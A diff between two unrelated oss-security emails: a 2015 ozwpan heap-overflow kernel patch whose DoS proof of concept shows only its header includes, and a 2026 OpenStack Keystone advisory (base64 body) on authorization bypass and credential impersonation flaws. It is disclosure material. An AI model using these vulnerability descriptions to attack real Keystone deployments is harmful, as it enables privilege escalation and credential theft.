@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["6232" "Wednesday" "13" "May" "2015" "20:58:18" "+0200" "Jason A. Donenfeld" "Jason@zx2c4.com" "<1431543500-4847-3-git-send-email-Jason@zx2c4.com>" "225" "[oss-security] [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow" nil nil nil "5" "2015051318:58:18" "[oss-security] [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow" (number mark "        Jason@zx2c4. May 13  225/6232  " thread-indent "\"[oss-security] [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow\"\n") "<1431543500-4847-1-git-send-email-Jason@zx2c4.com>" ("<20150513185322.GA4029@kroah.com>" "<1431543500-4847-1-git-send-email-Jason@zx2c4.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 21904 invoked by uid 550); 13 May 2015 18:59:23 -0000
+Received: (qmail 23950 invoked by uid 550); 28 May 2026 20:56:12 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,253 +6,328 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 18032 invoked from network); 13 May 2015 18:58:53 -0000
-DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=zx2c4.com; h=from:to:cc
-	:subject:date:message-id:in-reply-to:references; s=mail; bh=4s8U
-	Akly6i3zTHpYHRy1sssBI8w=; b=BoI8d0Q+tnEk1plzZu3sqYp2alBIc/ONRm7N
-	UtkXzeWwjFM4KjPY+4bi6BLQiJ0KPm7lmgvN0gOuJUzTFIb1+1IhCDOE0QSrcYCH
-	0/ufyi/XSiyinZl25o+f9zqlAN1xp2XX6bbiZ/alQ2CYIz427+XIbBXJOlU9ZGtg
-	G9P5smDaC6dkjM/gryelZMS/LSRk6VeJoKC5YV6+BEB+HUC6Ywdnjq7zd/S4NVEN
-	cUaAkvMqej13x6wQaOy7UyRqjl/vvnXTr3YyCtNu7kzPDzY1J9HMbTwoz++gqnDA
-	2Omif/FKHTbkzEMTIAIsGuezFOlcYLsXgqJSai7OvRfa6agD1g==
-Message-Id: <1431543500-4847-3-git-send-email-Jason@zx2c4.com>
-X-Mailer: git-send-email 2.3.6
-In-Reply-To: <1431543500-4847-1-git-send-email-Jason@zx2c4.com>
-References: <20150513185322.GA4029@kroah.com>
- <1431543500-4847-1-git-send-email-Jason@zx2c4.com>
-Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Date: Wed, 13 May 2015 20:58:18 +0200
-From: "Jason A. Donenfeld" <Jason@zx2c4.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow
-To: oss-security <oss-security@lists.openwall.com>,
-	linux-kernel@vger.kernel.org,
-	Shigekatsu Tateno <shigekatsu.tateno@atmel.com>,
-	Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
-	devel@driverdev.osuosl.org
+x-ms-reactions: disallow
+Received: (qmail 16102 invoked from network); 28 May 2026 16:38:13 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1779986283; x=1780591083; darn=lists.openwall.com;
+        h=autocrypt:subject:to:content-language:from:user-agent:mime-version
+         :date:message-id:from:to:cc:subject:date:message-id:reply-to;
+        bh=v3QcfqYnn9SquPsKMCkabE/Eg8rUuS8tA5fPJmCNn+Y=;
+        b=cGpVvF/nZtcsxp/zoGc1HYRbOFEC4CNNjpxcooiiu+ZVZuOVOVqDezIUY4MvKWzcGm
+         hDXSBWzjOHO2sRJRcEUXWVfXcAl88knRdjWp6iFMWRGv2jsl2/XMrDV2oTmiJKjdSKsT
+         9IT+2rsbgFFxLiRig2Mma+YSytwTblJjWXs8f0MiT+H9I471CsCwrIy4Tje4eTekcckv
+         QYaUeAuCaC/gxwcUb6Pgqxl7b2AnBBR5TLjArMMpG5vzR1HbJ1D2sw0nNmfgp5ZSgqm/
+         fopFd6ChS5Bm3uHdl2KSSohOKOjCAvTUg1GwAmg495SCfdGKDliKA3PQPv3fixLJ5GHv
+         HVGw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1779986283; x=1780591083;
+        h=autocrypt:subject:to:content-language:from:user-agent:mime-version
+         :date:message-id:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=v3QcfqYnn9SquPsKMCkabE/Eg8rUuS8tA5fPJmCNn+Y=;
+        b=eaiTjVrgkJjRatYVSZ7E0BxMNfUkT1ONK5rc0OMZydg+xc2/QrL2i5OO41PFo66Nbj
+         RKNC2lgcJI/IQwm/zvzNIiHfWKkKKB9PY5UflYuLyAomOpjkvFJZSUN98MfWHE3+Mjbi
+         GuIVLJThpJ6tdZlYCw/HQv3g1v/TsCT0VZJmgBdD+5xN5CFHkZzYmTeHtSC7PAuMvxt9
+         /iqCvdy/4LViyl8/Dzadj7lHnRLGdZfSrpQX1bL4sk+QjtFwIoYh68+6nL/UMluAGB3o
+         3aOXp+Q/UufoMYAZuSMBXboD+cVNz3HAUYuZEtDAFoXW5I0q5P3nSpAOvcrPPBsREcOM
+         6tcw==
+X-Gm-Message-State: AOJu0YwN1wRwuiGGRlU9kf0//Lox04Q6wzaLMV77R10KTP4clhP0r6Fu
+	FJyCtyO81jT+Rxzrqp7if+LZQNpouEGO+UTNbFqgorXeQT/wDVwNwYEvjvC8/w==
+X-Gm-Gg: Acq92OH44vdIeA/DVOxSfW5VVQi2LJHSjQLKvv+OnnEEYcv3+hW4D0yNNnHDNC8JSbc
+	zNeWSeOW9pqGHurVOA/Jn2TKV+8zYQJFIDHAVug5zk58oL2MUwgtncSRSXYij1bqn/ZaB5mD7Dp
+	PDR5huVPDUkUpGLTAwtam0zGHxKBExCSz89TI7Uwcch9ncxu7TbE6K/0XGXmQ+CusukljSSd1EL
+	0X6Id2oevokrC5jRl+0TqkkMWIFutD+5czJ2nVQFcFQH0+gjAGfbMLt121hpWErSTIONtid6guA
+	xQai2f9Z5Z1cj1civdnOx3chK7v+tZjyWHF0uY/3rTwac0NYwhOy+vXrzNsl9mZENahQHgWItMQ
+	NKVcL57J/XMQkfV68oYoSG6Y56J0TxDppYcdjSNDQc5WCMPK6TJo20ra6CDO+y654jMBbxO5BZM
+	EqGUW+GoL74u1Q6zSrMzSDnvVP9luDpCly9ULQtg74yiicEhsxmkFILsDkMQ==
+X-Received: by 2002:a05:7022:1286:b0:11a:e426:911a with SMTP id a92af1059eb24-1365f821ccbmr12658190c88.15.1779986283460;
+        Thu, 28 May 2026 09:38:03 -0700 (PDT)
+Message-ID: <eda670ae-ab8d-470c-a2cb-b98fb3e86475@gmail.com>
+Date: Thu, 28 May 2026 09:38:01 -0700
+MIME-Version: 1.0
+User-Agent: Mozilla Thunderbird
+From: Goutham Pacha Ravi <gouthampravi@gmail.com>
+Content-Language: en-US
+To: oss-security@lists.openwall.com
+Autocrypt: addr=gouthampravi@gmail.com; keydata=
+ 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
+ VYvdtAgTRIrQIz/K
+Content-Type: multipart/signed; micalg=pgp-sha256;
+ protocol="application/pgp-signature";
+ boundary="------------PoQOSJlmBJu8XSWQjljebCy6"
+Subject: [oss-security] [OSSA-2026-015] OpenStack Keystone: Multiple credential delegation
+ and authorization bypass vulnerabilities (CVE-2026-42998, CVE-2026-42999,
+ CVE-2026-43000, CVE-2026-43001, CVE-2026-44394)
 
-Using signed integers, the subtraction between required_size and offset
-could wind up being negative, resulting in a memcpy into a heap buffer
-with a negative length, resulting in huge amounts of network-supplied
-data being copied into the heap, which could potentially lead to remote
-code execution.. This is remotely triggerable with a magic packet.
-A PoC which obtains DoS follows below. It requires the ozprotocol.h file
-from this module.
+--------------PoQOSJlmBJu8XSWQjljebCy6
+Content-Type: multipart/mixed; boundary="------------Hted8dlcFMIll0u90uiF44t6";
+ protected-headers="v1"; hp="clear"
+Message-ID: <eda670ae-ab8d-470c-a2cb-b98fb3e86475@gmail.com>
+Date: Thu, 28 May 2026 09:38:01 -0700
+MIME-Version: 1.0
+User-Agent: Mozilla Thunderbird
+From: Goutham Pacha Ravi <gouthampravi@gmail.com>
+Content-Language: en-US
+To: oss-security@lists.openwall.com
+Subject: [OSSA-2026-015] OpenStack Keystone: Multiple credential delegation
+ and authorization bypass vulnerabilities (CVE-2026-42998, CVE-2026-42999,
+ CVE-2026-43000, CVE-2026-43001, CVE-2026-44394)
+Autocrypt: addr=gouthampravi@gmail.com; keydata=
+ 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
+ VYvdtAgTRIrQIz/K
 
-=-=-=-=-=-=
+--------------Hted8dlcFMIll0u90uiF44t6
+Content-Type: multipart/mixed; boundary="------------Rbi492AYNQGihbJwrVUTTIOv"
 
- #include <arpa/inet.h>
- #include <linux/if_packet.h>
- #include <net/if.h>
- #include <netinet/ether.h>
- #include <stdio.h>
- #include <string.h>
- #include <stdlib.h>
- #include <endian.h>
- #include <sys/ioctl.h>
- #include <sys/socket.h>
+--------------Rbi492AYNQGihbJwrVUTTIOv
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: base64
 
- #define u8 uint8_t
- #define u16 uint16_t
- #define u32 uint32_t
- #define __packed __attribute__((__packed__))
- #include "ozprotocol.h"
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCk9TU0EtMjAyNi0wMTU6
+IE11bHRpcGxlIGNyZWRlbnRpYWwgZGVsZWdhdGlvbiBhbmQgYXV0aG9yaXphdGlvbiBieXBhc3Mg
+DQp2dWxuZXJhYmlsaXRpZXMgaW4gS2V5c3RvbmUNCj09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09DQoNCjpEYXRlOiBNYXkgMjgsIDIwMjYNCjpDVkU6IENWRS0yMDI2LTQy
+OTk4LA0KICAgICAgIENWRS0yMDI2LTQyOTk5LA0KICAgICAgIENWRS0yMDI2LTQzMDAwLA0KICAg
+ICAgIENWRS0yMDI2LTQzMDAxLA0KICAgICAgIENWRS0yMDI2LTQ0Mzk0DQoNCg0KQWZmZWN0cw0K
+fn5+fn5+fg0KLSBLZXlzdG9uZTogPj0xNC4wLjAgPDI3LjAuMiwgPj0yOC4wLjAgPDI4LjAuMiwg
+Pj0yOS4wLjAgPDI5LjAuMg0KDQoNCkRlc2NyaXB0aW9uDQp+fn5+fn5+fn5+fg0KQm9yaXMgQm9i
+cm92IGZyb20gU0FQIFNFIHJlcG9ydGVkIHRoYXQgYW4gYXV0aGVudGljYXRlZCBhdHRhY2tlciBj
+YW4gDQppbmplY3QgUkJBQyBwb2xpY3kgdGFyZ2V0cyB2aWEgdGhlIEpTT04gcmVxdWVzdCBib2R5
+LCBieXBhc3NpbmcgDQphdXRob3JpemF0aW9uIG9uIGFueSBwb2xpY3ktcHJvdGVjdGVkIGVuZHBv
+aW50IHRvIHJlYWQgY3JlZGVudGlhbCANCnNlY3JldHMsIGNyZWF0ZSBjcmVkZW50aWFscyBmb3Ig
+YXJiaXRyYXJ5IHVzZXJzLCBhbmQgZXNjYWxhdGUgdG8gY2xvdWQgDQphZG1pbiAoQ1ZFLTIwMjYt
+NDI5OTkpLiBBcHBsaWNhdGlvbiBjcmVkZW50aWFsIGF1dGhlbnRpY2F0aW9uIGRvZXMgbm90IA0K
+dmVyaWZ5IHRoZSBjYWxsZXIgb3ducyB0aGUgY3JlZGVudGlhbCwgZW5hYmxpbmcgdXNlciBpbXBl
+cnNvbmF0aW9uIA0Kd2l0aGluIGEgc2hhcmVkIHByb2plY3QgKENWRS0yMDI2LTQyOTk4KS4gVGhp
+cyBpbXBlcnNvbmF0aW9uIGNhbiBiZSANCmNoYWluZWQgd2l0aCB0cnVzdHMgdG8gZXNjYWxhdGUg
+ZnJvbSBtZW1iZXIgdG8gYWRtaW4sIHdpdGggdGhlIHJlc3VsdGluZyANCnRydXN0IHBlcnNpc3Rp
+bmcgaW5kZXBlbmRlbnRseSAoQ1ZFLTIwMjYtNDMwMDApLiBUaW0gU2hlcGhlcmQgZnJvbSANCnJv
+aWFpLmNhIHJlcG9ydGVkIHRoYXQgYXBwbGljYXRpb24gY3JlZGVudGlhbHMgc2NvcGVkIHRvIG9u
+ZSBwcm9qZWN0IGNhbiANCmNyZWF0ZSBFQzIgY3JlZGVudGlhbHMgZm9yIGEgZGlmZmVyZW50IHBy
+b2plY3QgKENWRS0yMDI2LTQzMDAxKS4gRXJpY2hlbiANCmZyb20gdGhlIEluc3RpdHV0ZSBvZiBD
+b21wdXRpbmcgVGVjaG5vbG9neSwgQ2hpbmVzZSBBY2FkZW15IG9mIFNjaWVuY2VzIA0KcmVwb3J0
+ZWQgdGhhdCBmZWRlcmF0ZWQgdXNlcnMgY2FuIG1haW50YWluIGFjY2VzcyBpbmRlZmluaXRlbHkg
+YnkgDQpyZXBlYXRlZGx5IHJlc2NvcGluZyB0b2tlbnMgYmVmb3JlIGV4cGlyeSwgYXMgZWFjaCBy
+ZXNjb3BlIGlzc3VlcyBhIA0KZnJlc2ggZnVsbC1UVEwgdG9rZW4gaW5zdGVhZCBvZiBpbmhlcml0
+aW5nIHRoZSBvcmlnaW5hbCBleHBpcnkgDQooQ1ZFLTIwMjYtNDQzOTQpLiBBZGRpdGlvbmFsbHks
+IEFydGVtIEdvbmNoYXJvdiBmcm9tIFN5c0VsZXZlbiBHbWJIIA0KaWRlbnRpZmllZCByZWxhdGVk
+IGlzc3VlcyBpbiB0cnVzdC1zY29wZWQgdG9rZW4gaGFuZGxpbmcgYW5kIHBvbGljeSANCmVuZm9y
+Y2VtZW50IGR1cmluZyBpbnZlc3RpZ2F0aW9uLiBBbGwgS2V5c3RvbmUgZGVwbG95bWVudHMgYXJl
+IGFmZmVjdGVkOyANCkNWRS0yMDI2LTQ0Mzk0IG9ubHkgYWZmZWN0cyBTQU1MMi9PSURDIGRlcGxv
+eW1lbnRzLg0KDQoNCg0KUGF0Y2hlcw0Kfn5+fn5+fg0KLSBodHRwczovL3Jldmlldy5vcGVuZGV2
+Lm9yZy85OTA1MDAgKDIwMjUuMS9lcG94eSkNCi0gaHR0cHM6Ly9yZXZpZXcub3BlbmRldi5vcmcv
+OTkwNTAxICgyMDI1LjEvZXBveHkpDQotIGh0dHBzOi8vcmV2aWV3Lm9wZW5kZXYub3JnLzk5MDUw
+MiAoMjAyNS4xL2Vwb3h5KQ0KLSBodHRwczovL3Jldmlldy5vcGVuZGV2Lm9yZy85OTA1MDMgKDIw
+MjUuMS9lcG94eSkNCi0gaHR0cHM6Ly9yZXZpZXcub3BlbmRldi5vcmcvOTkwNTA0ICgyMDI1LjEv
+ZXBveHkpDQotIGh0dHBzOi8vcmV2aWV3Lm9wZW5kZXYub3JnLzk5MDQ5NSAoMjAyNS4yL2ZsYW1p
+bmdvKQ0KLSBodHRwczovL3Jldmlldy5vcGVuZGV2Lm9yZy85OTA0OTYgKDIwMjUuMi9mbGFtaW5n
+bykNCi0gaHR0cHM6Ly9yZXZpZXcub3BlbmRldi5vcmcvOTkwNDk3ICgyMDI1LjIvZmxhbWluZ28p
+DQotIGh0dHBzOi8vcmV2aWV3Lm9wZW5kZXYub3JnLzk5MDQ5OCAoMjAyNS4yL2ZsYW1pbmdvKQ0K
+LSBodHRwczovL3Jldmlldy5vcGVuZGV2Lm9yZy85OTA0OTkgKDIwMjUuMi9mbGFtaW5nbykNCi0g
+aHR0cHM6Ly9yZXZpZXcub3BlbmRldi5vcmcvOTkwNDkwICgyMDI2LjEvZ2F6cGFjaG8pDQotIGh0
+dHBzOi8vcmV2aWV3Lm9wZW5kZXYub3JnLzk5MDQ5MSAoMjAyNi4xL2dhenBhY2hvKQ0KLSBodHRw
+czovL3Jldmlldy5vcGVuZGV2Lm9yZy85OTA0OTIgKDIwMjYuMS9nYXpwYWNobykNCi0gaHR0cHM6
+Ly9yZXZpZXcub3BlbmRldi5vcmcvOTkwNDkzICgyMDI2LjEvZ2F6cGFjaG8pDQotIGh0dHBzOi8v
+cmV2aWV3Lm9wZW5kZXYub3JnLzk5MDQ5NCAoMjAyNi4xL2dhenBhY2hvKQ0KLSBodHRwczovL3Jl
+dmlldy5vcGVuZGV2Lm9yZy85OTA0ODUgKDIwMjYuMi9oaWJpc2N1cykNCi0gaHR0cHM6Ly9yZXZp
+ZXcub3BlbmRldi5vcmcvOTkwNDg2ICgyMDI2LjIvaGliaXNjdXMpDQotIGh0dHBzOi8vcmV2aWV3
+Lm9wZW5kZXYub3JnLzk5MDQ4NyAoMjAyNi4yL2hpYmlzY3VzKQ0KLSBodHRwczovL3Jldmlldy5v
+cGVuZGV2Lm9yZy85OTA0ODggKDIwMjYuMi9oaWJpc2N1cykNCi0gaHR0cHM6Ly9yZXZpZXcub3Bl
